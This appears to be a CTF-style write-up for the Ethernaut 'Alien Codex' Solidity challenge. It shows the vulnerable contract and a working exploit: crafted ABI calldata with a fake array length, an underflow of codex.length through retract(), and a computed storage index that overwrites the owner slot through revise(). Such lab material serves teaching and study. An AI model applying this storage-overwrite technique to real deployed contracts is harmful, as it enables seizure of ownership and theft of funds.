# Alien Codex
You've uncovered an Alien contract. Claim ownership to complete the level.
Things that might help
* Understanding how array storage works
* Understanding ABI specifications
* Using a very underhanded approach
```javascript
pragma solidity ^0.4.24;

import 'zeppelin-solidity/contracts/ownership/Ownable.sol';

contract AlienCodex is Ownable {

  bool public contact;
  bytes32[] public codex;

  modifier contacted() {
    assert(contact);
    _;
  }
  
  function make_contact(bytes32[] _firstContactMessage) public {
    assert(_firstContactMessage.length > 2**200);
    contact = true;
  }

  function record(bytes32 _content) contacted public {
  	codex.push(_content);
  }

  function retract() contacted public {
    codex.length--;
  }

  function revise(uint i, bytes32 _content) contacted public {
    codex[i] = _content;
  }
}
```
To bypass the modifier `contacted` of every function, we need to conquer the condition `assert(_firstContactMessage.length > 2**200);` in `make_contact()` function.

Here's array length, if you try to achieve this with `contract.make_contact()`, you have to build a array which length is greater than 2*200.

We got a better method which just simply modified the array length in transaction payload to fake it without real array elements data.

Let's first get the function id for `web3.eth.sendTransaction()`:
![](https://i.imgur.com/9iNUfNg.png)
```javascript
> FuncID="0x1d3d4c0b";
```

Then let's find what's following:
https://solidity.readthedocs.io/en/v0.4.25/abi-spec.html#examples
https://solidity.readthedocs.io/en/v0.4.25/abi-spec.html#use-of-dynamic-types
```javascript
> Location="0000000000000000000000000000000000000000000000000000000000000020";
```
The location of the data part of the first parameter (dynamic type), measured in bytes from the start of the arguments block. In this case, 0x20.
```javascript
> DataLengh="1000000000000000000000000000000000000000000000000000000000000001";
```
Number of elements of the array, `.length > 2**200`
```javascript
> data=FuncID+Location+DataLengh;
> web3.eth.sendTransaction({from:'/*playerAddress*/',to:'/*instanceAddress*/',data: data,gas: 1111111},function(x,y){console.error(y)});
```

After that, we know that all memory space for a contract is `2**256` slot, and array `codex` store at `slot x`.

If we modify `codex[y](y=2**256-x)`, that might overflow `slot 2**256` back to `slot 0` and overwrite it.

Let's first get in to check the codex storage position.
https://solidity.readthedocs.io/en/v0.4.25/miscellaneous.html#layout-of-state-variables-in-storage

From document, we found that array might store at `keccak256(p)`, `p` is position and allocate with type length, in this case, `bytes32`, so final result is `keccak256((bytes32(1)))`.
```javascript
function test() view returns(bytes32){
    return keccak256((bytes32(1)));
}
```
![](https://i.imgur.com/Wg9wMiC.png)

-> `0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6`

`codex`'s position must be `slot 0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6`.

`codex[y](y=2**256-x)` must be `y=2**256-0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6`.

```javascript
function test() view returns(uint){
    return 2**256-0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6;
}
```

To modify `codex[y]`, we should make sure that `y<codex.length`.

According to `retract()` doesn't have a check for int underflow, we can simply calling it to make `codex.length` from `0` to `2**256-1`.

Then, we overwrite to owner address.

```javascript
await contract.owner()
await contract.codex.length
await contract.retract()
contract.revise('35707666377435648211887908874984608119992236509074197713628505308453184860938', '0x000000000000000000000000eBaEf941c3F10c33792278Ab7d91549DfEf0782B', {from:player, gas: 900000});
await contract.owner()
```